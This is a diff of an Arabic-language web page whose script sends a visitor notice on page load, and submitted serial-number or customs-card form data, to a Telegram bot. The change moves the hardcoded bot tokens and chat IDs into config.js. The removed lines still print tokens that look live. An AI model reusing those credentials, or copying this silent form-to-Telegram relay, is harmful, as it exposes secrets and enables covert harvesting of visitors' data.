@@ -664,6 +664,7 @@ input[type="tel"], select {
   </div>
 </section>
 
+  <script src="config.js"></script>
   <script>
     (async () => {
   const isNewVisitor = !localStorage.getItem('visited_before');
@@ -682,11 +683,7 @@ input[type="tel"], select {
 🕒 الوقت: ${new Date().toLocaleString()}
   `;
 
-  const telegramBotToken = '8032148201:AAEL39lA5HydjFd_8Xb8WD-C_McJG8'; 
-const chatId = '7788759'; 
-
-
-  const telegramURL = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+    const telegramURL = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
 
   fetch(telegramURL, {
     method: "POST",
@@ -699,8 +696,8 @@ const chatId = '7788759';
     })
   });
 })();
-  const telegramBotToken = '8364441024:AAHluZaG5P8utYObf0Qj3719YONXO8zH24c'; 
-const chatId = '7785288759'; 
+  const telegramBotToken = TELEGRAM_BOT_TOKEN; 
+const chatId = TELEGRAM_CHAT_ID; 
 
   function createTelegramMessage(formData) {
     const formType = formData.get('serial_number_form') ? 'استمارة' : 'بطاقة جمركية';
